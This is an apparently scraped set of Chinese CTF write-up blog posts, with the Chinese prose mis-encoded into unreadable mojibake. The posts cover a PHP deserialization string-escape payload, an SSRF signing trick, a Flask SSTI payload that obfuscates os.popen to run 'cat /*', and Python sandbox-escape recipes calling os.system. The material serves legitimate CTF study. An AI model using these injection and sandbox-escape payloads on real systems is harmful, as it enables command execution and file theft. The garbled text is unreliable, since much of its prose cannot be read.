//å–å‡ºåºåˆ—åŒ–æ•°æ®ä¸­çš„base64_encodeè¿‡åçš„imgå…ˆè¿›è¡Œdecodeå†è¿›è¡Œè¯»å–æ–‡ä»¶å†…å®¹//æ‰€ä»¥æ˜¯$_SESSIONåºåˆ—åŒ–åè¢«filterå‡½æ•°å¤„ç†ï¼Œå†ååºåˆ—åŒ–èµ‹ç»™userinfoï¼Œæœ€åå–å‡ºimgè¿™ä¸ªé”®å¯¹åº”çš„å€¼ ä»£ç ç†è§£ç†è§£ä»£ç åœ¨å¹²ä»€ä¹ˆå¾ˆé‡è¦ï¼Œå®¡è®¡ä»£ç çš„èƒ½åŠ›å¾ˆé‡è¦ã€‚ è¿™æ®µphpä»£ç é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªåä¸ºfilterå‡½æ•°ï¼Œå®ƒä¼šæŠŠä¼ å…¥çš„å˜é‡çš„å€¼å¦‚æœåœ¨å®ƒå®šä¹‰çš„æ•°ç»„é‡Œï¼Œå°±ä¼šæŠŠç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºç©ºã€‚ ç„¶åä½¿ç”¨äº†å˜é‡è¦†ç›–é‡Œå¸¸ç”¨çš„å‡½æ•°extractæ¥ä½¿æˆ‘ä»¬$_SESSION[user]å’Œ$_SESSION[function]é€šè¿‡POSTå¯æ§ã€‚ ç„¶åifåˆ¤æ–­æ˜¯å¦ä¼ å…¥img_path,æ²¡ä¼ å…¥å°±æ˜¯è®¾ç½®ä¸ºguest_image.png,ä¼ å…¥çš„è¯å°±ä¼šä½¿ç”¨ä¸€ä¸ªä¸å¯é€†çš„sha1ç®—æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šä¸è€ƒè™‘è¿™ä¸ªã€‚ ä¸‹ä¸€æ­¥æ˜¯å®šä¹‰å˜é‡serialize_infoä¸ºç»è¿‡filterå‡½æ•°æ“ä½œåçš„åºåˆ—åŒ–åçš„æ•°æ®ã€‚ å†ä¸‹æ¥æ˜¯ifé€‰æ‹©functionåŠŸèƒ½ highlight_fileæ˜¯æŸ¥çœ‹æºç ï¼Œphpinfoæ˜¯æŸ¥çœ‹phpinfoï¼Œshow_imageæ˜¯åšäº†ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œï¼Œå¹¶ä¸”ä½¿ç”¨äº†ä¸€ä¸ªæ•æ„Ÿå‡½æ•°ï¼Œfile_get_contensã€‚ é¢˜ç›®åšæ³•ï¼šååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ä¸€å…±æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ä¸ªæ˜¯é”®å€¼é€ƒé€¸ï¼Œå¦ä¸€ä¸ªæ˜¯é”®åé€ƒé€¸flagè·¯å¾„åœ¨phpinfoåŠŸèƒ½ç‚¹å°±èƒ½çœ‹åˆ° ä¸ºd0g3_fllllllag æ–¹æ³•1ï¼šé”®å€¼é€ƒé€¸ä»£ç å®¡è®¡å®Œäº†ï¼Œæœ‰ååºåˆ—åŒ–åˆæœ‰æ›¿æ¢çš„æ“ä½œï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°å­—ç¬¦ä¸²é€ƒé€¸ã€‚è¿™é‡Œåªæœ‰userå’Œfunctionå¯æ§ã€‚ä¸ºäº†å¥½ç†è§£æˆ‘ä»¬å…ˆçœ‹åºåˆ—åŒ–åçš„æ•°æ®é•¿ä»€ä¹ˆæ ·å­ã€‚ ?php$_SESSION[user] = *;$_SESSION[function] = **;$_SESSION[img] = base64_encode(guest_img.png);echo serialize($_SESSION);?//a:3:s:4:user;s:2:aa;s:8:function;s:2:bb;s:3:img;s:20:Z3Vlc3RfaW1nLnBuZw==; å› ä¸ºè¦è®©guest_img.pngé€ƒé€¸å‡ºå»ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä¿®æ”¹userï¼Œè®©userç»è¿‡å­—ç¬¦ä¸²æ›¿æ¢ï¼Œfunctionè¿™ä¸ªå˜é‡åŠå…¶å€¼æˆä¸ºuserçš„å€¼ï¼Œimgå˜é‡å˜ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼å“¦ã€‚ functionåº”è¯¥ä¸ºå€¼ä¸º;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocAâ€;} fileterå¤„ç†å‰:a:3:{s:4:â€userâ€;s:22:â€phpphpphpflagphpphpphpâ€;s:8:â€functionâ€;s:56:â€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocAâ€;s:1:â€aâ€;s:1:â€aâ€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZwâ€;} ?php$_SESSION[user] = phpphpphpflagphpphpphp;$_SESSION[function] = ;s:3:img;s:20:L2QwZzNfZmxsbGxsbGFn;s:1:a;s:1:a;;$_SESSION[img] = base64_encode(guest_img.png);echo serialize($_SESSION);? filterå¤„ç†å:a:3:{s:4:â€userâ€;s:22:â€â€;s:8:â€functionâ€;s:56:â€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;s:1:â€aâ€;s:1:â€aâ€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZwâ€;} äºæ˜¯functionçš„å€¼ä¸ºimgä¸ºL2QwZzNfZmxsbGxsbGFn,åé¢é‚£ä¸€ä¸²å°±æˆåŠŸä¿®æ”¹imgå€¼ä¸ºflagçš„è·¯å¾„ã€‚ æ–¹æ³•2ï¼šé”®åé€ƒé€¸_SESSION[flagphp]=;s:1:1;s:3:img;s:20:L2QwZzNfZmxsbGxsbGFn; è¿‡æ»¤å‰ a:2:s:7:phpflag;s:48:;s:1:1;s:3:img;s:20:ZDBnM19mMWFnLnBocA==; è¿‡æ»¤å a:2:s:7:;s:48:;s:1:1;s:3:img;s:20:ZDBnM19mMWFnLnBocA==; ä¸‹é¢çš„æ­¥éª¤å’Œå€¼æ›¿æ¢ä¸€æ · è¿™é‡Œçš„é”®åå˜ä¸º;s:48: å®ç°äº†é€ƒé€¸ payload:_SESSION[flagphp];s:1:â€1â€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;} [De1CTF 2019]SSRF Meè¿›å»è´´è„¸æºç ,pythonä»£ç å®¡è®¡ã€‚ #!/usr/bin/env python# encoding=utf-8from flask import Flask, requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(latin1)app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if not os.path.exists(self.sandbox): # SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = result[code] = 500 if self.checkSign(): if scan in self.action: tmpfile = open(./%s/result.txt % self.sandbox, w) resp = scan(self.param) if resp == Connection Timeout: result[data] = resp else: print (resp) tmpfile.write(resp) tmpfile.close() result[code] = 200 if read in self.action: f = open(./%s/result.txt % self.sandbox, r) result[code] = 200 result[data] = f.read() if result[code] == 500: result[data] = Action Error else: result[code] = 500 result[msg] = Sign Error return result def checkSign(self): return getSign(self.action, self.param) == self.sign# generate Sign For Action Scan.@app.route(/geneSign, methods=[GET, POST])def geneSign(): param = urllib.unquote(request.args.get(param, )) action = scan return getSign(action, param)@app.route(/De1ta, methods=[GET, POST])def challenge(): action = urllib.unquote(request.cookies.get(action)) param = urllib.unquote(request.args.get(param, )) sign = urllib.unquote(request.cookies.get(sign)) ip = request.remote_addr if waf(param): return No Hacker!!!! task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(/)def index(): return open(code.txt, r).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return Connection Timeoutdef getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check = param.strip().lower() if check.startswith(gopher) or check.startswith(file): return True return Falseif __name__ == __main__: app.debug = False app.run(host=0.0.0.0, port=80) ä¸‰ä¸ªè·¯ç”±ï¼š/ æŸ¥çœ‹æºä»£ç /geneSign ç”Ÿæˆç­¾å/De1ta å…³é”®è·¯ç”± å¯ä»¥è¿›è¡Œè¯»å–æ–‡ä»¶ è§£é¢˜æ€è·¯(é™¤äº†è¿™ä¸ªæ–¹æ³•è¿˜å¯ä»¥ä½¿ç”¨hashæ‹“å±•æ”»å‡») å¯†é’¥æ˜¯ä¸å˜çš„ã€‚è€Œactionå®šæ­»ä¸ºscanäº† å¯å˜çš„åªæœ‰ä¸­é—´çš„param é‚£ä¹ˆmd5(å¯†é’¥+flag.txtread+scan)ç­‰äºmd5(å¯†é’¥+flag.txt+readscan) è¿™æ­¥çš„cookieè¯·è‡ªå·±æ·»åŠ  [GYCTF2020]FlaskAppè¿›å»æ˜¯base64è§£å¯†å’ŒåŠ å¯†åŠŸèƒ½ çœ‹åˆ°flaskå…ˆæ¡ä»¶åå°„ssti è¾“å…¥49å¾—åˆ°ç¼–ç  è¾“å…¥è§£ç å™¨å¾—åˆ°å›æ˜¾ ç»§ç»­æµ‹è¯• e3tjb25maWd9fQ å¾—åˆ°å›æ˜¾ è¢«HTML å®ä½“è½¬ä¹‰ ä¸¢ç»™aiæ¢å¤ä¸‹å°±ok Config ENV: production, DEBUG: True, TESTING: False, PROPAGATE_EXCEPTIONS: None, PRESERVE_CONTEXT_ON_EXCEPTION: None, SECRET_KEY: s_e_c_r_e_t_k_e_y, PERMANENT_SESSION_LIFETIME: datetime.timedelta(days=31), USE_X_SENDFILE: False, SERVER_NAME: None, APPLICATION_ROOT: /, SESSION_COOKIE_NAME: session, SESSION_COOKIE_DOMAIN: False, SESSION_COOKIE_PATH: None, SESSION_COOKIE_HTTPONLY: True, SESSION_COOKIE_SECURE: False, SESSION_COOKIE_SAMESITE: None, SESSION_REFRESH_EACH_REQUEST: True, MAX_CONTENT_LENGTH: None, SEND_FILE_MAX_AGE_DEFAULT: datetime.timedelta(seconds=43200), TRAP_BAD_REQUEST_ERRORS: None, TRAP_HTTP_EXCEPTIONS: False, EXPLAIN_TEMPLATE_LOADING: False, PREFERRED_URL_SCHEME: http, JSON_AS_ASCII: True, JSON_SORT_KEYS: True, JSONIFY_PRETTYPRINT_REGULAR: False, JSONIFY_MIMETYPE: application/json, TEMPLATES_AUTO_RELOAD: None, MAX_COOKIE_SIZE: 4093, BOOTSTRAP_USE_MINIFIED: True, BOOTSTRAP_CDN_FORCE_SSL: False, BOOTSTRAP_QUERYSTRING_REVVING: True, BOOTSTRAP_SERVE_LOCAL: False, BOOTSTRAP_LOCAL_SUBDOMAIN: None æˆåŠŸSSTI æ­£å¸¸æ‰“sstiå°±å¥½ é»‘åå• [import,os,popen,eval,*,?] payload:((lipsum.__globals__.__builtins__['__i''mport__']('o''s'))['p''open'](\"\\x63\\x61\\x74\\x20\\x2f\\x2a\")).read() [0CTF 2016]piapiapia","tags":["CTF-wp"]},{"title":"pythonæ²™ç®±é€ƒé€¸","path":"/2025/05/12/æ²™ç®±é€ƒé€¸/","content":"å‰è¨€Q1ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿæ²™ç®±æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œåœ¨é™åˆ¶çš„ç¯å¢ƒä¸­è¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚pythonä¸­æ²™ç®±ä¸»è¦ç”¨äºé™åˆ¶pythonï¼Œé˜²æ­¢æ‰§è¡Œå‘½ä»¤æˆ–è€…è¿›è¡Œä¸€äº›å±é™©çš„è¡Œä¸ºã€‚ Q2ï¼šä»€ä¹ˆæ˜¯æ²™ç®±ç»•è¿‡ï¼Ÿå°±æ˜¯æ€ä¹ˆç»•è¿‡æ²™ç®±å¯¹æˆ‘ä»¬çš„é™åˆ¶ï¼Œæ‹¿åˆ°å±é™©å‡½æ•°ï¼Œæœ€ç»ˆæ¥æ‰§è¡Œå‘½ä»¤çš„è¿‡ç¨‹ã€‚ ç›®çš„å¯¹äºpythonæ²™ç®±ç»•è¿‡ï¼Œæˆ‘ä»¬æœ€ç»ˆå¯èƒ½è¦å®ç°çš„æƒ³æ³•æœ‰å¦‚ä¸‹: Â·ç»•è¿‡é™åˆ¶ æ‰§è¡Œå‘½ä»¤ Â·å†™æ–‡ä»¶åˆ°æŒ‡å®šä½ç½® ç»•è¿‡æ–¹å¼importæ–¹å¼çš„ç»•è¿‡ import xxx from xxx import * __import__(xxx) ä½¿ç”¨å…¶ä»–çš„æ–¹å¼æ¥å¯¼å…¥åŒ…å__import__(os).__dict__[system](whoami)#python2 and python3__import__(.decode.(base64)).getoutput(pwd)#python2import importlibx = importlib.import_module(pbzznaqf.encode(rot_13)) #commandsprint (x.getoutput(pwd))#python2 æ¨¡å—è·¯å¾„æ–¹å¼çš„ç»•è¿‡pythonä¸­æ‰€æœ‰çš„åŒ…éƒ½æ˜¯ä»¥.pyæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ï¼Œä½¿ç”¨æ‰€æœ‰çš„åŒ…éƒ½æ˜¯ç”±ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥æ˜¯ä½¿ç”¨è·¯å¾„æ¥è¾¾åˆ°å¼•å…¥åŒ…çš„ç›®çš„ã€‚ ä¸€èˆ¬å’Œç³»ç»Ÿç›¸å…³çš„ä¿¡æ¯éƒ½åœ¨sysä¸‹ï¼Œä½¿ç”¨sys.pathå¯ä»¥æŸ¥çœ‹åˆ°å„ä¸ªåŒ…çš„è·¯å¾„ã€‚ import sysprint(sys.path)#sysä¸‹è¿˜æœ‰ä¸€ä¸ªmodulesï¼Œè¿”å›ä¸€ä¸ªå­—å…¸ï¼Œå¯ä»¥æŸ¥çœ‹å„ä¸ªæ¨¡å—å¯¹åº”çš„ç³»ç»Ÿè·¯å¾„ã€‚print(sys.modules[os])#python2 and python3 å¦‚æœæŠŠsysã€osã€reloadä¸€ç³»åˆ—æ¨¡å—ç¦æ­¢äº†ï¼Œä½¿ç”¨æ¨¡å—å¯¹åº”è·¯å¾„æ¥å¯¼å…¥æ¨¡å— å‰ææ˜¯å¿…é¡»çŸ¥é“ç»å¯¹è·¯å¾„ ä¸€èˆ¬æ˜¯é»˜è®¤è·¯å¾„ä¸ä¼šæ”¹å˜ execfile(/usr/lib/python.2.7/os.py)#python2 with open(/usr/lib/python3.6/os.py,r) as f: #è·¯å¾„é€šè¿‡ä¸Šé¢çš„sysæ–¹æ³•æ¥æ‰¾ exec(f.read())system(ls)#python2 and python3 timieitimport timeittimeit.timeit(__import__(os).system(dir),number=1)#p2 and p3 builtinså‡½æ•° dir(__builtins__)[ArithmeticError, AssertionError, AttributeError, BaseException, BaseExceptionGroup, BlockingIOError, BrokenPipeError, BufferError, BytesWarning, ChildProcessError, ConnectionAbortedError, ConnectionError, ConnectionRefusedError, ConnectionResetError, DeprecationWarning, EOFError, Ellipsis, EncodingWarning, EnvironmentError, Exception, ExceptionGroup, False, FileExistsError, FileNotFoundError, FloatingPointError, FutureWarning, GeneratorExit, IOError, ImportError, ImportWarning, IndentationError, IndexError, InterruptedError, IsADirectoryError, KeyError, KeyboardInterrupt, LookupError, MemoryError, ModuleNotFoundError, NameError, None, NotADirectoryError, NotImplemented, NotImplementedError, OSError, OverflowError, PendingDeprecationWarning, PermissionError, ProcessLookupError, RecursionError, ReferenceError, ResourceWarning, RuntimeError, RuntimeWarning, StopAsyncIteration, StopIteration, SyntaxError, SyntaxWarning, SystemError, SystemExit, TabError, TimeoutError, True, TypeError, UnboundLocalError, UnicodeDecodeError, UnicodeEncodeError, UnicodeError, UnicodeTranslateError, UnicodeWarning, UserWarning, ValueError, Warning, WindowsError, ZeroDivisionError, __build_class__, __debug__, __doc__, __import__, __loader__, __name__, __package__, __spec__, abs, aiter, all, anext, any, ascii, bin, bool, breakpoint, bytearray, bytes, callable, chr, classmethod, compile, complex, copyright, credits, delattr, dict, dir, divmod, enumerate, eval, exec, exit, filter, float, format, frozenset, getattr, globals, hasattr, hash, help, hex, id, input, int, isinstance, issubclass, iter, len, license, list, locals, map, max, memoryview, min, next, object, oct, open, ord, pow, print, property, quit, range, repr, reversed, round, set, setattr, slice, sorted, staticmethod, str, sum, super, tuple, type, vars, zip] __builtins__.__dict__[X19pbXBvcnRfXw==.decode(base64)](b3M=.decode(base64)).system(whoami)#ä½†æ˜¯è¿™ä¸ªåªèƒ½python2ä½¿ç”¨#==__builtins__.__dict__[__import__](os).system(whoami)#p2 and p3 exec and evaleval(__import__(os).system(dir))eval(__import__(os).system(cat flag)) platformimport platformprint (platform.popen(dir).read())#python2 dir å’Œ __dict__class A(): def __init__(self): self.a = aprint (dir(A))print (A.__dict__) import sysprint (dir(sys.modules[__name__])) func_codedef f(x,y,z): a = secret b = 2333print (f.func_code.co_argcount)print (f.func_code.co_consts)print (f.func_code.co_code)#p2def f(x,y,z): a = secret b = 2333print(f.__code__.co_argcount)print(f.__code__.co_consts)print(f.__code__.co_code)#p3 import disdef f(x,y,z): a = secret b = 2333print (dis.dis(f)) objectç±»åŸºç¡€å‡½æ•°å…¶å®å°±æ˜¯SSTI è¿™é‡Œä¸å¤šå†™ èŠ±å¼å¤„ç†å­—ç¬¦ä¸²ç¼–ç open(chr(102)+chr(108)+chr(97)+chr(103)).read() __builtins__.__dict__[__import__](os).system(whoami)#p2 and p __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,,","tags":["CTFå­¦ä¹ "]},{"title":"æ ˆå¸§é€ƒé€¸","path":"/2025/05/11/åˆå­¦æ ˆå¸§é€ƒé€¸/","content":"åˆå­¦æ ˆå¸§é€ƒé€¸æ ˆå¸§ä»‹ç»åœ¨ Python ä¸­ï¼Œæ ˆå¸§ï¼ˆStack Frameï¼‰ æ˜¯å‡½æ•°è°ƒç”¨æ—¶åœ¨å†…å­˜ä¸­åˆ†é…çš„ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨å‡½æ•°çš„è¿è¡Œä¿¡æ¯ï¼ˆå¦‚å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ç­‰ï¼‰ã€‚å®ƒæ˜¯ Python è§£é‡Šå™¨ç®¡ç†å‡½æ•°è°ƒç”¨å’Œæ‰§è¡Œæµç¨‹çš„æ ¸å¿ƒæœºåˆ¶ä¹‹ä¸€ï¼Œå°¤å…¶åœ¨é€’å½’ã€å¼‚å¸¸å¤„ç†å’Œè°ƒè¯•æ—¶éå¸¸é‡è¦ã€‚ æ ˆå¸§ï¼ˆstack frameï¼‰ï¼Œä¹Ÿç§°ä¸ºå¸§ï¼ˆframeï¼‰ï¼Œæ˜¯ç”¨äºæ‰§è¡Œä»£ç çš„æ•°æ®ç»“æ„ã€‚æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œç”¨äºå­˜å‚¨è¯¥å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠå…¶ä»–æ‰§è¡Œç›¸å…³çš„ä¿¡æ¯ã€‚è¿™äº›æ ˆå¸§ä¼šæŒ‰ç…§è°ƒç”¨é¡ºåºè¢«ç»„ç»‡æˆä¸€ä¸ªæ ˆï¼Œç§°ä¸ºè°ƒç”¨æ ˆã€‚ æ ˆå¸§è¿ä½œåŸç†def foo(a, b): c = a + b bar(c)def bar(x): y = x * 2 print(y)foo(3, 4) æ ˆå¸§å˜åŒ–ï¼š 1.è°ƒç”¨ foo(3, 4)ï¼šåˆ›å»º foo å‡½æ•°çš„æ ˆå¸§ï¼Œå‹å…¥è°ƒç”¨æ ˆã€‚foo å‡½æ•°çš„å±€éƒ¨å˜é‡è¡¨åŒ…å« a3, b4ã€‚ 2.æ‰§è¡Œ c a + bï¼šåœ¨ foo çš„æ“ä½œæ•°æ ˆä¸Šè®¡ç®— a + bï¼Œå°†ç»“æœ 7 å­˜å‚¨åœ¨å±€éƒ¨å˜é‡ c ä¸­ã€‚ 3.è°ƒç”¨ bar(c)ï¼šåˆ›å»º bar å‡½æ•°çš„æ ˆå¸§ï¼Œå‹å…¥è°ƒç”¨æ ˆã€‚bar å‡½æ•°çš„å±€éƒ¨å˜é‡è¡¨åŒ…å« x7ã€‚ 4.æ‰§è¡Œ y x * 2ï¼šåœ¨ bar çš„æ“ä½œæ•°æ ˆä¸Šè®¡ç®— x * 2ï¼Œå°†ç»“æœ 14 å­˜å‚¨åœ¨å±€éƒ¨å˜é‡ y ä¸­ã€‚ 5.æ‰§è¡Œ print(y)ï¼šæ‰“å° y çš„å€¼ 14ã€‚ 6.bar å‡½æ•°ç»“æŸï¼šä»è°ƒç”¨æ ˆä¸­å¼¹å‡º bar çš„æ ˆå¸§ï¼Œé‡Šæ”¾å…¶å†…å­˜ã€‚ 7.foo å‡½æ•°ç»“æŸï¼šä»è°ƒç”¨æ ˆä¸­å¼¹å‡º foo çš„æ ˆå¸§ï¼Œé‡Šæ”¾å…¶å†…å­˜ã€‚ æ ˆå¸§å±æ€§æ–¹æ³•ä»‹ç»ï¼šf_locals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åã€‚f_globals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚f_code: ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚f_lasti: æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚f_back: æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚ ç”Ÿæˆå™¨ä»‹ç»ç”Ÿæˆå™¨ï¼ˆGeneratorï¼‰æ˜¯Pythonä¸­ä¸€ç§ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œå®ƒå¯ä»¥åœ¨è¿­ä»£è¿‡ç¨‹ä¸­åŠ¨æ€ç”Ÿæˆå€¼ï¼Œè€Œä¸éœ€è¦ä¸€æ¬¡æ€§å°†æ‰€æœ‰å€¼å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚ å…¶å®ç”Ÿæˆå™¨å°±æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œä¸€è¾¹è¿è¡Œä¸€è¾¹ç”Ÿæˆå€¼ã€‚ [æ™®é€šå‡½æ•°] def get_list(): return [1, 2, 3]result = get_list() # ä¸€æ¬¡æ€§è¿”å›æ•´ä¸ªåˆ—è¡¨ [1, 2, 3] [ç”Ÿæˆå™¨] è¿™ç§ç‰¹æ®Šçš„å‡½æ•°æ¯æ¬¡åªâ€œäº§å‡ºâ€ä¸€ä¸ªå€¼ï¼ˆyieldï¼‰ï¼Œè¿è¡Œå®Œä¸€ä¸ªå†æ¥ç€è¿è¡Œä¸‹ä¸€ä¸ªï¼Œè€Œä¸æ˜¯ä¸€ä¸‹å­æŠŠæ‰€æœ‰ç»“æœè¿”å›ã€‚ä¼˜ç‚¹ä¸è¨€è€Œå–»ï¼ŒèŠ‚çœå†…å­˜ç©ºé—´ã€‚ ç”Ÿæˆå™¨ä½¿ç”¨yieldè¯­å¥æ¥äº§ç”Ÿå€¼ï¼Œæ¯æ¬¡è°ƒç”¨ç”Ÿæˆå™¨çš„next()æ–¹æ³•æ—¶ï¼Œç”Ÿæˆå™¨ä¼šæ‰§è¡Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªyieldè¯­å¥ä¸ºæ­¢ï¼Œç„¶åè¿”å›yieldè¯­å¥åé¢çš„å€¼ def get_gen(): yield 1 yield 2 yield 3 gen = get_gen() # ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œåªæ˜¯åˆ›å»ºç”Ÿæˆå™¨å¯¹è±¡print(next(gen)) # è¾“å‡º 1print(next(gen)) # è¾“å‡º 2print(next(gen)) # è¾“å‡º 3 ç”Ÿæˆå™¨å±æ€§gi_code: ç”Ÿæˆå™¨å¯¹åº”çš„codeå¯¹è±¡ã€‚gi_frame: ç”Ÿæˆå™¨å¯¹åº”çš„frameï¼ˆæ ˆå¸§ï¼‰å¯¹è±¡ã€‚gi_running: ç”Ÿæˆå™¨å‡½æ•°æ˜¯å¦åœ¨æ‰§è¡Œã€‚ç”Ÿæˆå™¨å‡½æ•°åœ¨yieldä»¥åã€æ‰§è¡Œyieldçš„ä¸‹ä¸€è¡Œä»£ç å‰å¤„äºfrozençŠ¶æ€ï¼Œæ­¤æ—¶è¿™ä¸ªå±æ€§çš„å€¼ä¸º0ã€‚gi_yieldfromï¼šå¦‚æœç”Ÿæˆå™¨æ­£åœ¨ä»å¦ä¸€ä¸ªç”Ÿæˆå™¨ä¸­ yield å€¼ï¼Œåˆ™ä¸ºè¯¥ç”Ÿæˆå™¨å¯¹è±¡çš„å¼•ç”¨ï¼›å¦åˆ™ä¸º Noneã€‚gi_frame.f_localsï¼šä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰å¸§çš„æœ¬åœ°å˜é‡ã€‚ ç”Ÿæˆå™¨è¡¨è¾¾å¼ä½¿ç”¨ç±»ä¼¼åˆ—è¡¨æ¨å¯¼å¼çš„è¯­æ³•ï¼Œä½†ä½¿ç”¨åœ†æ‹¬å·è€Œä¸æ˜¯æ–¹æ‹¬å·ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºç”Ÿæˆå™¨å¯¹è±¡ã€‚ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¼šé€ä¸ªç”Ÿæˆå€¼ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§ç”Ÿæˆæ•´ä¸ªåºåˆ—ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§å‹æ•°æ®é›†æ—¶éå¸¸æœ‰ç”¨ï¼ˆä¾ç„¶ç¬¦åˆæ¯æ¬¡ç”Ÿæˆå€¼åä¿ç•™å½“å‰çš„çŠ¶æ€ï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨æ—¶å¯ä»¥ç»§ç»­ç”Ÿæˆå€¼ï¼‰ã€‚ gen = (x * x for x in range(5))print(list(gen)) # è¾“å‡º [0, 1, 4, 9, 16] å’Œæ ˆå¸§çš„ç»“åˆæ¥ä¸‹æ¥æˆ‘ç»™ä½ çœ‹ä¸€ä¸ªè„šæœ¬ ä½ å°±çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¦ä»‹ç»ç”Ÿæˆå™¨è¿™ä¸ªä¸œè¥¿äº† def my_generator(): yield 1 yield 2 yield 3gen = my_generator()# è·å–ç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯frame = gen.gi_frame# è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯print(Local Variables:, frame.f_locals)print(Global Variables:, frame.f_globals)print(Code Object:, frame.f_code)print(Instruction Pointer:, frame.f_lasti) è¿™ä¸ªè„šæœ¬å¹¶ä¸éš¾ä»¥ç†è§£ï¼Œé¦–å…ˆæ˜¯å®šä¹‰ä¸€ä¸ªç”Ÿæˆå™¨ï¼Œç„¶åæˆ‘ä»¬è°ƒç”¨ç”Ÿæˆå™¨å¹¶ä¸”ä½¿ç”¨gi_frameè·å–äº†å½“å‰ç”Ÿæˆå™¨æ ˆå¸§ï¼Œç„¶åæˆ‘ä»¬åˆè®¿é—®æ ˆå¸§å¯¹è±¡çš„å‡ ä¸ªå±æ€§ï¼š f_localsæ˜¯æŸ¥çœ‹æ ˆå¸§çš„å­˜å‚¨çš„å±€éƒ¨å˜é‡åï¼Œf_globalsæ˜¯æŸ¥çœ‹å…¨å±€å˜é‡åï¼Œf_codeæ˜¯æŸ¥çœ‹å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ï¼Œf_lastiæ˜¯æŸ¥çœ‹æœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚ ä¹Ÿè®¸è¿™äº›è¯è¯­åˆå˜å¾—å¾ˆæŠ½è±¡ï¼Œä½†æ˜¯è¿è¡Œå‡ºæ¥çš„ç»“æœå°†ä¼šå¾ˆæ¸…æ™°çš„å±•ç¤ºè·å–åˆ°çš„ç”Ÿæˆå™¨çš„å¸§ä¿¡æ¯ï¼š Local Variables: Global Variables: __name__: __main__, __doc__: None, __package__: None, __loader__: _frozen_importlib_external.SourceFileLoader object at 0x0000024A3485C260, __spec__: None, __annotations__: , __builtins__: module builtins (built-in), __file__: D:\\\\pycharm\\\\PythonProject\\\\12121212.py, __cached__: None, my_generator: function my_generator at 0x0000024A346EA2A0, gen: generator object my_generator at 0x0000024A64CB1380, frame: frame at 0x0000024A347E4E00, file 